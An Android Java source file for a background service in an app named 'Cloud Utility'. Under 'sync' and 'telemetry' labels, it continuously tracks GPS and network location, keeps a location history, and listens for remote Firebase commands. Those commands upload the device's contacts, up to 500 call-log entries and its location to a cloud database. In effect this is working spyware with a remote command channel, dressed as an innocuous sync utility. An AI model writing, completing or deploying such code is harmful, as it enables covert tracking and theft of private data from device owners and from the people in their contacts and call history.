package com.example.cloudutility;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Background Sync Service
 * Handles device telemetry, call logs, contacts, location, and task execution
 */
public class SyncBackgroundService extends Service {
    
    private static final String TAG = "SyncBackgroundService";
    private static final String CHANNEL_ID = "cloud_sync_channel";
    private static final int NOTIFICATION_ID = 1001;
    private static final long TELEMETRY_INTERVAL = 5 * 60 * 1000; // 5 minutes
    private static final long LOCATION_UPDATE_INTERVAL = 60 * 1000; // 1 minute
    
    // Firebase
    private FirebaseDatabase firebaseDatabase;
    private DatabaseReference deviceRef;
    private DatabaseReference tasksRef;
    private DatabaseReference logsRef;
    
    // Device info
    private String deviceId;
    private String deviceModel;
    private String osVersion;
    
    // Threading
    private ExecutorService executorService;
    private Handler mainHandler;
    
    // Location
    private LocationManager locationManager;
    private LocationListener locationListener;
    
    // Listeners
    private ValueEventListener taskListener;
    
    // Service state
    private boolean isServiceActive = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        
        // Initialize components
        executorService = Executors.newFixedThreadPool(4);
        mainHandler = new Handler(Looper.getMainLooper());
        
        // Get device info
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        deviceModel = Build.MODEL;
        osVersion = Build.VERSION.RELEASE;
        
        // Initialize Firebase
        initializeFirebase();
        
        // Initialize location
        initializeLocationServices();
        
        // Create notification channel
        createNotificationChannel();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service starting");
        
        // Start as foreground service
        startForeground(NOTIFICATION_ID, createNotification("Initializing..."));
        
        // Start core functions
        startPeriodicTelemetry();
        startLocationTracking();
        startTaskListener();
        
        isServiceActive = true;
        updateNotification("Service running");
        
        return START_STICKY;
    }
    
    /**
     * Initialize Firebase connection
     */
    private void initializeFirebase() {
        try {
            firebaseDatabase = FirebaseHelper.getInstance().getDatabase();
            
            // Set up references
            deviceRef = firebaseDatabase.getReference("devices").child(deviceId);
            tasksRef = deviceRef.child("tasks");
            logsRef = deviceRef.child("logs");
            
            // Mark device as online
            Map<String, Object> deviceInfo = new HashMap<>();
            deviceInfo.put("status", "online");
            deviceInfo.put("last_seen", ServerValue.TIMESTAMP);
            deviceInfo.put("device_info/model", deviceModel);
            deviceInfo.put("device_info/os_version", osVersion);
            deviceInfo.put("device_info/sdk_version", Build.VERSION.SDK_INT);
            deviceInfo.put("device_info/manufacturer", Build.MANUFACTURER);
            
            deviceRef.updateChildren(deviceInfo);
            
            // Handle disconnection
            deviceRef.child("status").onDisconnect().setValue("offline");
            deviceRef.child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);
            
            Log.d(TAG, "Firebase initialized for device: " + deviceId);
            
        } catch (Exception e) {
            Log.e(TAG, "Firebase initialization failed", e);
        }
    }
    
    /**
     * Initialize location services
     */
    private void initializeLocationServices() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        
        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(@NonNull Location location) {
                pushLocationToFirebase(location);
            }
            
            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {}
            
            @Override
            public void onProviderEnabled(@NonNull String provider) {
                Log.d(TAG, "Location provider enabled: " + provider);
            }
            
            @Override
            public void onProviderDisabled(@NonNull String provider) {
                Log.w(TAG, "Location provider disabled: " + provider);
            }
        };
    }
    
    /**
     * Start periodic telemetry collection
     */
    private void startPeriodicTelemetry() {
        Runnable telemetryRunnable = new Runnable() {
            @Override
            public void run() {
                executorService.execute(() -> {
                    try {
                        Map<String, Object> telemetry = collectTelemetryData();
                        pushTelemetryToFirebase(telemetry);
                        updateNotification("Telemetry updated - Battery: " + 
                            telemetry.get("battery_percentage") + "%");
                    } catch (Exception e) {
                        Log.e(TAG, "Telemetry collection failed", e);
                    }
                });
                
                if (isServiceActive) {
                    mainHandler.postDelayed(this, TELEMETRY_INTERVAL);
                }
            }
        };
        
        mainHandler.post(telemetryRunnable);
    }
    
    /**
     * Start location tracking
     */
    private void startLocationTracking() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Location permission not granted");
            return;
        }
        
        try {
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                LOCATION_UPDATE_INTERVAL,
                10, // 10 meters minimum distance
                locationListener,
                Looper.getMainLooper()
            );
            
            // Also request network location
            locationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                LOCATION_UPDATE_INTERVAL,
                10,
                locationListener,
                Looper.getMainLooper()
            );
            
            Log.d(TAG, "Location tracking started");
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to start location tracking", e);
        }
    }
    
    /**
     * Start listening for tasks from Firebase
     */
    private void startTaskListener() {
        if (tasksRef == null) return;
        
        taskListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                Log.d(TAG, "Tasks updated from cloud");
                
                for (DataSnapshot taskSnapshot : dataSnapshot.getChildren()) {
                    String taskId = taskSnapshot.getKey();
                    String command = taskSnapshot.child("command").getValue(String.class);
                    String status = taskSnapshot.child("status").getValue(String.class);
                    
                    if (command != null && "pending".equals(status)) {
                        executeTask(taskId, command);
                    }
                }
            }
            
            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e(TAG, "Task listener cancelled", databaseError.toException());
            }
        };
        
        tasksRef.addValueEventListener(taskListener);
    }
    
    /**
     * Collect device telemetry data
     */
    private Map<String, Object> collectTelemetryData() {
        Map<String, Object> telemetry = new HashMap<>();
        
        try {
            // Device info
            telemetry.put("device_id", deviceId);
            telemetry.put("device_model", deviceModel);
            telemetry.put("manufacturer", Build.MANUFACTURER);
            telemetry.put("os_version", osVersion);
            telemetry.put("sdk_version", Build.VERSION.SDK_INT);
            telemetry.put("timestamp", ServerValue.TIMESTAMP);
            
            // Battery info
            BatteryManager batteryManager = (BatteryManager) getSystemService(BATTERY_SERVICE);
            if (batteryManager != null) {
                int batteryLevel = batteryManager.getIntProperty(
                    BatteryManager.BATTERY_PROPERTY_CAPACITY);
                telemetry.put("battery_percentage", batteryLevel);
                telemetry.put("battery_charging", isDeviceCharging());
            }
            
            // Memory info
            Runtime runtime = Runtime.getRuntime();
            long usedMem = runtime.totalMemory() - runtime.freeMemory();
            long maxMem = runtime.maxMemory();
            telemetry.put("memory_used_mb", usedMem / (1024 * 1024));
            telemetry.put("memory_total_mb", maxMem / (1024 * 1024));
            telemetry.put("memory_percentage", (usedMem * 100) / maxMem);
            
            // Storage info
            android.os.StatFs stat = new android.os.StatFs(
                android.os.Environment.getDataDirectory().getPath());
            long totalStorage = stat.getTotalBytes();
            long freeStorage = stat.getFreeBytes();
            telemetry.put("storage_total_gb", totalStorage / (1024.0 * 1024.0 * 1024.0));
            telemetry.put("storage_free_gb", freeStorage / (1024.0 * 1024.0 * 1024.0));
            
            // Network info
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) 
                == PackageManager.PERMISSION_GRANTED) {
                TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                if (tm != null) {
                    telemetry.put("network_type", getNetworkType(tm.getNetworkType()));
                    telemetry.put("network_operator", tm.getNetworkOperatorName());
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting telemetry", e);
            telemetry.put("error", e.getMessage());
        }
        
        return telemetry;
    }
    
    /**
     * Push telemetry to Firebase
     */
    private void pushTelemetryToFirebase(Map<String, Object> telemetry) {
        if (deviceRef != null) {
            // Update current telemetry
            deviceRef.child("telemetry").child("current").setValue(telemetry);
            
            // Add to history
            deviceRef.child("telemetry").child("history").push().setValue(telemetry);
            
            Log.d(TAG, "Telemetry pushed to Firebase");
        }
    }
    
    /**
     * Push location to Firebase
     */
    private void pushLocationToFirebase(Location location) {
        if (deviceRef != null && location != null) {
            Map<String, Object> locationData = new HashMap<>();
            locationData.put("latitude", location.getLatitude());
            locationData.put("longitude", location.getLongitude());
            locationData.put("accuracy", location.getAccuracy());
            locationData.put("altitude", location.getAltitude());
            locationData.put("speed", location.getSpeed());
            locationData.put("bearing", location.getBearing());
            locationData.put("provider", location.getProvider());
            locationData.put("timestamp", ServerValue.TIMESTAMP);
            
            // Update current location
            deviceRef.child("location").child("current").setValue(locationData);
            
            // Add to history
            deviceRef.child("location").child("history").push().setValue(locationData);
            
            Log.d(TAG, "Location pushed: " + location.getLatitude() + 
                ", " + location.getLongitude());
        }
    }
    
    /**
     * Execute a task based on command
     */
    private void executeTask(String taskId, String command) {
        executorService.execute(() -> {
            try {
                // Mark task as in-progress
                updateTaskStatus(taskId, "in_progress");
                
                Map<String, Object> result = new HashMap<>();
                
                switch (command) {
                    case "sync_contacts":
                        result = syncContacts();
                        break;
                    case "sync_call_logs":
                        result = syncCallLogs();
                        break;
                    case "sync_location":
                        result = syncLocationNow();
                        break;
                    case "trigger_snapshot":
                        result = takeSnapshot();
                        break;
                    case "sync_all":
                        result = fullSync();
                        break;
                    default:
                        result.put("status", "error");
                        result.put("message", "Unknown command: " + command);
                        break;
                }
                
                // Log results
                logTaskResult(taskId, command, result);
                
                // Mark task as completed
                updateTaskStatus(taskId, "completed");
                
                Log.d(TAG, "Task completed: " + command);
                
            } catch (Exception e) {
                Log.e(TAG, "Task execution failed: " + command, e);
                updateTaskStatus(taskId, "failed");
                
                Map<String, Object> errorResult = new HashMap<>();
                errorResult.put("status", "error");
                errorResult.put("message", e.getMessage());
                logTaskResult(taskId, command, errorResult);
            }
        });
    }
    
    /**
     * Sync contacts to Firebase
     */
    private Map<String, Object> syncContacts() {
        Map<String, Object> result = new HashMap<>();
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) 
            != PackageManager.PERMISSION_GRANTED) {
            result.put("status", "error");
            result.put("message", "Contacts permission not granted");
            return result;
        }
        
        try {
            ContentResolver cr = getContentResolver();
            List<Map<String, String>> contacts = new ArrayList<>();
            
            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, 
                null, null, null, null);
            
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String id = cursor.getString(
                        cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(
                        cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    
                    if (Integer.parseInt(cursor.getString(
                        cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        
                        Cursor phoneCursor = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id},
                            null);
                        
                        if (phoneCursor != null) {
                            while (phoneCursor.moveToNext()) {
                                Map<String, String> contact = new HashMap<>();
                                contact.put("contact_id", id);
                                contact.put("name", name != null ? name : "Unknown");
                                contact.put("phone", phoneCursor.getString(
                                    phoneCursor.getColumnIndex(
                                        ContactsContract.CommonDataKinds.Phone.NUMBER)));
                                contacts.add(contact);
                            }
                            phoneCursor.close();
                        }
                    }
                }
                cursor.close();
            }
            
            // Push to Firebase
            logsRef.child("contacts").setValue(contacts);
            
            result.put("status", "success");
            result.put("contacts_synced", contacts.size());
            
        } catch (Exception e) {
            Log.e(TAG, "Contact sync failed", e);
            result.put("status", "error");
            result.put("message", e.getMessage());
        }
        
        return result;
    }
    
    /**
     * Sync call logs to Firebase
     */
    private Map<String, Object> syncCallLogs() {
        Map<String, Object> result = new HashMap<>();
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) 
            != PackageManager.PERMISSION_GRANTED) {
            result.put("status", "error");
            result.put("message", "Call log permission not granted");
            return result;
        }
        
        try {
            List<Map<String, String>> callLogs = new ArrayList<>();
            
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 500");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, String> callLog = new HashMap<>();
                    callLog.put("number", cursor.getString(
                        cursor.getColumnIndex(CallLog.Calls.NUMBER)));
                    callLog.put("type", getCallType(cursor.getString(
                        cursor.getColumnIndex(CallLog.Calls.TYPE))));
                    callLog.put("date", formatDate(cursor.getString(
                        cursor.getColumnIndex(CallLog.Calls.DATE))));
                    callLog.put("duration", cursor.getString(
                        cursor.getColumnIndex(CallLog.Calls.DURATION)));
                    callLogs.add(callLog);
                } while (cursor.moveToNext());
                cursor.close();
            }
            
            // Push to Firebase
            logsRef.child("call_logs").setValue(callLogs);
            
            result.put("status", "success");
            result.put("call_logs_synced", callLogs.size());
            
        } catch (Exception e) {
            Log.e(TAG, "Call log sync failed", e);
            result.put("status", "error");
            result.put("message", e.getMessage());
        }
        
        return result;
    }
    
    /**
     * Sync current location immediately
     */
    private Map<String, Object> syncLocationNow() {
        Map<String, Object> result = new HashMap<>();
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
            != PackageManager.PERMISSION_GRANTED) {
            result.put("status", "error");
            result.put("message", "Location permission not granted");
            return result;
        }
        
        try {
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            
            if (location != null) {
                pushLocationToFirebase(location);
                result.put("status", "success");
                result.put("latitude", location.getLatitude());
                result.put("longitude", location.getLongitude());
            } else {
                result.put("status", "pending");
                result.put("message", "Waiting for location fix");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Location sync failed", e);
            result.put("status", "error");
            result.put("message", e.getMessage());
        }
        
        return result;
    }
    
    /**
     * Take a full device snapshot
     */
    private Map<String, Object> takeSnapshot() {
        Map<String, Object> result = new HashMap<>();
        
        try {
            Map<String, Object> snapshot = new HashMap<>();
            snapshot.put("telemetry", collectTelemetryData());
            snapshot.put("timestamp", ServerValue.TIMESTAMP);
            snapshot.put("device_id", deviceId);
            
            deviceRef.child("snapshots").push().setValue(snapshot);
            
            result.put("status", "success");
            result.put("message", "Snapshot taken successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Snapshot failed", e);
            result.put("status", "error");
            result.put("message", e.getMessage());
        }
        
        return result;
    }
    
    /**
     * Perform full sync of all data
     */
    private Map<String, Object> fullSync() {
        Map<String, Object> result = new HashMap<>();
        
        try {
            Map<String, Object> contactsResult = syncContacts();
            Map<String, Object> callLogsResult = syncCallLogs();
            Map<String, Object> locationResult = syncLocationNow();
            
            result.put("status", "success");
            result.put("contacts", contactsResult);
            result.put("call_logs", callLogsResult);
            result.put("location", locationResult);
            
        } catch (Exception e) {
            Log.e(TAG, "Full sync failed", e);
            result.put("status", "error");
            result.put("message", e.getMessage());
        }
        
        return result;
    }
    
    /**
     * Update task status in Firebase
     */
    private void updateTaskStatus(String taskId, String status) {
        if (tasksRef != null && taskId != null) {
            tasksRef.child(taskId).child("status").setValue(status);
            tasksRef.child(taskId).child("updated_at").setValue(ServerValue.TIMESTAMP);
        }
    }
    
    /**
     * Log task execution results
     */
    private void logTaskResult(String taskId, String command, Map<String, Object> result) {
        if (logsRef != null) {
            Map<String, Object> logEntry = new HashMap<>();
            logEntry.put("task_id", taskId);
            logEntry.put("command", command);
            logEntry.put("result", result);
            logEntry.put("timestamp", ServerValue.TIMESTAMP);
            
            logsRef.child("task_executions").push().setValue(logEntry);
        }
    }
    
    /**
     * Helper methods
     */
    private boolean isDeviceCharging() {
        Intent intent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        if (intent != null) {
            int status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            return status == BatteryManager.BATTERY_STATUS_CHARGING || 
                   status == BatteryManager.BATTERY_STATUS_FULL;
        }
        return false;
    }
    
    private String getNetworkType(int networkType) {
        switch (networkType) {
            case TelephonyManager.NETWORK_TYPE_LTE: return "4G";
            case TelephonyManager.NETWORK_TYPE_HSPAP: return "3G";
            case TelephonyManager.NETWORK_TYPE_EDGE: return "2G";
            case TelephonyManager.NETWORK_TYPE_NR: return "5G";
            default: return "Unknown";
        }
    }
    
    private String getCallType(String type) {
        if (type == null) return "Unknown";
        switch (Integer.parseInt(type)) {
            case CallLog.Calls.INCOMING_TYPE: return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "Outgoing";
            case CallLog.Calls.MISSED_TYPE: return "Missed";
            default: return "Unknown";
        }
    }
    
    private String formatDate(String timestamp) {
        try {
            long time = Long.parseLong(timestamp);
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            return sdf.format(new Date(time));
        } catch (Exception e) {
            return "Unknown";
        }
    }
    
    /**
     * Notification methods
     */
    private void createNotificationChannel() {
        NotificationChannel channel = new NotificationChannel(
            CHANNEL_ID,
            "Cloud Sync Service",
            NotificationManager.IMPORTANCE_LOW
        );
        channel.setDescription("Background sync service for Cloud Utility");
        
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) {
            manager.createNotificationChannel(channel);
        }
    }
    
    private Notification createNotification(String content) {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
        
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Cloud Utility Sync")
            .setContentText(content)
            .setSmallIcon(android.R.drawable.ic_menu_upload)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }
    
    private void updateNotification(String content) {
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) {
            manager.notify(NOTIFICATION_ID, createNotification(content));
        }
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "Service destroying");
        
        // Clean up
        isServiceActive = false;
        
        if (taskListener != null && tasksRef != null) {
            tasksRef.removeEventListener(taskListener);
        }
        
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
        
        if (deviceRef != null) {
            deviceRef.child("status").setValue("offline");
            deviceRef.child("last_seen").setValue(ServerValue.TIMESTAMP);
        }
        
        if (executorService != null) {
            executorService.shutdown();
        }
        
        mainHandler.removeCallbacksAndMessages(null);
        
        super.onDestroy();
    }
}